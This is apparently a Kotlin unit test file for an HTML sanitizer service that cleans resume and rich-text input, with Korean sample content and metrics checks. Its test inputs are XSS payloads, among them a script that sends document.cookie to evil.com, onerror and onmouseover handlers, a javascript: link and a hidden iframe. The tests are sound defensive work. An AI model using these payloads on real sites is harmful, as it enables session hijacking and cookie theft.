package com.example.demo.sanitization

import com.example.demo.annotation.SanitizePolicy
import io.micrometer.core.instrument.simple.SimpleMeterRegistry
import org.junit.jupiter.api.Assertions.*
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test

class HtmlSanitizerServiceTest {

    private lateinit var service: HtmlSanitizerService
    private lateinit var meterRegistry: SimpleMeterRegistry

    @BeforeEach
    fun setUp() {
        meterRegistry = SimpleMeterRegistry()
        service = HtmlSanitizerService(
            plainTextPolicy = PlainTextSanitizationPolicy(),
            resumePolicy = ResumeSanitizationPolicy(),
            richTextPolicy = RichTextSanitizationPolicy(),
            meterRegistry = meterRegistry
        )
    }

    // ── PLAIN_TEXT policy ──────────────────────────────────────────────────

    @Test
    fun `PLAIN_TEXT strips script tag completely`() {
        val input = "Hello <script>alert('xss')</script> World"
        val result = service.sanitizeNonNull(input, SanitizePolicy.PLAIN_TEXT)
        assertFalse(result.contains("<script>"), "script tag must be removed")
        assertFalse(result.contains("alert("), "script content must be removed")
    }

    @Test
    fun `PLAIN_TEXT strips all HTML tags`() {
        val input = "<b>Bold</b> and <i>italic</i> text"
        val result = service.sanitizeNonNull(input, SanitizePolicy.PLAIN_TEXT)
        assertFalse(result.contains("<b>"), "b tag must be removed")
        assertFalse(result.contains("<i>"), "i tag must be removed")
    }

    @Test
    fun `PLAIN_TEXT preserves plain text content`() {
        val input = "이력서 내용: 경력 5년, Java & Kotlin 전문"
        val result = service.sanitizeNonNull(input, SanitizePolicy.PLAIN_TEXT)
        assertTrue(result.contains("이력서"), "Korean text must be preserved")
        assertTrue(result.contains("Kotlin"), "English text must be preserved")
    }

    // ── RESUME policy ──────────────────────────────────────────────────────

    @Test
    fun `RESUME strips dangerous script injection`() {
        val input = """<p>경력 사항</p><script>fetch('https://evil.com?cookie='+document.cookie)</script>"""
        val result = service.sanitizeNonNull(input, SanitizePolicy.RESUME)
        assertFalse(result.contains("<script>"), "script tag must be removed")
        assertFalse(result.contains("document.cookie"), "script body must be stripped")
        assertTrue(result.contains("경력 사항"), "content should be preserved")
    }

    @Test
    fun `RESUME strips iframe injection`() {
        val input = """<p>이름: 홍길동</p><iframe src="https://malicious.com" width="0" height="0"></iframe>"""
        val result = service.sanitizeNonNull(input, SanitizePolicy.RESUME)
        assertFalse(result.contains("<iframe>"), "iframe must be removed")
        assertFalse(result.contains("malicious.com"), "malicious URL must be removed")
    }

    @Test
    fun `RESUME strips on-event handlers`() {
        val input = """<p onmouseover="alert('xss')">경력 정보</p>"""
        val result = service.sanitizeNonNull(input, SanitizePolicy.RESUME)
        assertFalse(result.contains("onmouseover"), "event handler must be removed")
        assertTrue(result.contains("경력 정보"), "text content preserved")
    }

    @Test
    fun `RESUME allows safe formatting tags`() {
        val input = "<p>경력: <b>5년</b></p><ul><li>Java</li><li>Kotlin</li></ul>"
        val result = service.sanitizeNonNull(input, SanitizePolicy.RESUME)
        assertTrue(result.contains("<b>") || result.contains("<strong>"), "bold tag preserved")
        assertTrue(result.contains("<ul>"), "ul tag preserved")
        assertTrue(result.contains("<li>"), "li tag preserved")
    }

    @Test
    fun `RESUME strips img with onerror XSS`() {
        val input = """<img src="x" onerror="alert(1)"><p>내용</p>"""
        val result = service.sanitizeNonNull(input, SanitizePolicy.RESUME)
        assertFalse(result.contains("onerror"), "onerror attribute must be removed")
    }

    // ── RICH_TEXT policy ───────────────────────────────────────────────────

    @Test
    fun `RICH_TEXT strips javascript href`() {
        val input = """<a href="javascript:alert('xss')">Click me</a>"""
        val result = service.sanitizeNonNull(input, SanitizePolicy.RICH_TEXT)
        assertFalse(result.contains("javascript:"), "javascript: URI must be blocked")
    }

    @Test
    fun `RICH_TEXT strips form and input elements`() {
        val input = """<form action="https://evil.com"><input name="token" value="abc"></form>"""
        val result = service.sanitizeNonNull(input, SanitizePolicy.RICH_TEXT)
        assertFalse(result.contains("<form"), "form element must be removed")
        assertFalse(result.contains("<input"), "input element must be removed")
    }

    @Test
    fun `RICH_TEXT allows table structure`() {
        val input = "<table><tr><th>항목</th><th>기간</th></tr><tr><td>개발</td><td>3년</td></tr></table>"
        val result = service.sanitizeNonNull(input, SanitizePolicy.RICH_TEXT)
        assertTrue(result.contains("<table>"), "table tag preserved")
        assertTrue(result.contains("<tr>"), "tr tag preserved")
        assertTrue(result.contains("<td>"), "td tag preserved")
    }

    // ── Null/blank handling ────────────────────────────────────────────────

    @Test
    fun `null input returns null without exception`() {
        assertNull(service.sanitize(null, SanitizePolicy.RESUME))
    }

    @Test
    fun `blank input returns blank without exception`() {
        assertEquals("", service.sanitize("", SanitizePolicy.RESUME))
    }

    // ── Metrics ───────────────────────────────────────────────────────────

    @Test
    fun `sanitization counter increments on each call`() {
        service.sanitizeNonNull("hello", SanitizePolicy.PLAIN_TEXT)
        service.sanitizeNonNull("world", SanitizePolicy.PLAIN_TEXT)
        val count = meterRegistry.find("xss.sanitization.applied").counter()?.count() ?: 0.0
        assertEquals(2.0, count)
    }

    @Test
    fun `threat counter increments when content is modified`() {
        service.sanitizeNonNull("<script>evil()</script>", SanitizePolicy.PLAIN_TEXT)
        val threats = meterRegistry.find("xss.sanitization.threat_detected").counter()?.count() ?: 0.0
        assertTrue(threats >= 1.0, "threat counter should increment when content is stripped")
    }

    @Test
    fun `threat counter does NOT increment for clean input`() {
        service.sanitizeNonNull("Clean text without HTML", SanitizePolicy.PLAIN_TEXT)
        val threats = meterRegistry.find("xss.sanitization.threat_detected").counter()?.count() ?: 0.0
        assertEquals(0.0, threats, "threat counter should stay at 0 for clean input")
    }
}
